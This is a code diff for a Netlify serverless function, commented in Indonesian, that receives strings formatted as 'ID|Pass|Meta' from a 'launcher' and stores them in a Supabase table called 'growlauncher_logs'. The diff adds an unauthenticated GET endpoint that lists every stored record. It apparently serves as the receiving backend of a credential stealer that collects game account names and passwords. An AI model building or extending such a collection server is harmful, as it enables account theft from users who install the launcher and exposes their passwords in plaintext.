@@ -1,6 +1,7 @@
 const { createClient } = require('@supabase/supabase-js');
 
-const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
+// Pastikan variabel env ini sesuai dengan yang ada di Netlify
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_KEY);
 
 exports.handler = async (event) => {
     const headers = {
@@ -9,19 +10,29 @@ exports.handler = async (event) => {
         "Content-Type": "application/json"
     };
 
+    // --- LOGIKA GET: Mengambil data untuk ditampilkan di monitoring ---
+    if (event.httpMethod === 'GET') {
+        try {
+            const { data, error } = await supabase
+                .from('growlauncher_logs')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            if (error) throw error;
+            return { statusCode: 200, headers, body: JSON.stringify(data) };
+        } catch (err) {
+            return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
+        }
+    }
+
+    // --- LOGIKA POST/QUERY: Menyimpan data dari launcher ---
     try {
-        // Ambil data dari parameter 'd' ATAU 'data'
         const rawData = event.queryStringParameters.d || event.queryStringParameters.data;
 
         if (!rawData) {
-            return { 
-                statusCode: 400, 
-                headers, 
-                body: JSON.stringify({ error: "No data provided", debug: event.queryStringParameters }) 
-            };
+            return { statusCode: 400, headers, body: JSON.stringify({ error: "No data provided" }) };
         }
 
-        // Split data (Format: ID|Pass|Meta)
         const parts = rawData.split('|');
         const inputData = {
             idName: parts[0] || "Unknown",
@@ -29,7 +40,6 @@ exports.handler = async (event) => {
             meta: parts[2] || "None"
         };
 
-        // Simpan ke Supabase
         const { error } = await supabase
             .from('growlauncher_logs')
             .insert([
@@ -41,7 +51,6 @@ exports.handler = async (event) => {
             ]);
 
         if (error) throw error;
-
         return { statusCode: 200, headers, body: JSON.stringify({ status: "Success" }) };
     } catch (err) {
         return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
